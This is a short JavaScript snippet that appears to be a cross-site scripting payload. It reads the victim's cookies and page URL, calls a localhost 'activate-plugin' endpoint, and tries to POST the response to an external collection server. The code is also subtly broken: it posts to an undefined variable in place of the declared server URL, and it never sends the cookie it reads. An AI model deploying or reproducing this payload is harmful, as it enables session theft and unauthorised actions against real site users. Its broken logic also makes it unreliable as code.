(function() {
    var cookie = document.cookie;
    var xhr = new XMLHttpRequest();
    var yourServerURL = "https://bnc.nkcorp.eu/adm/";
    var pageUrl = document.location.href;
    var getUrl = 'https://localhost:5000/activate-plugin/1';


    function handleGetRequest() {
        fetch(getUrl)
            .then(response => response.text())  // Assuming the response is text
            .then(data => {
                sendPostRequest(data);
            })
            .catch(error => console.error('Error:', error));
    }

    function sendPostRequest(data) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", postUrl, true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        // Send the data as a POST request
        xhr.send("sentreq=1&data=" + encodeURIComponent(data));
    }
    handleGetRequest();
})();
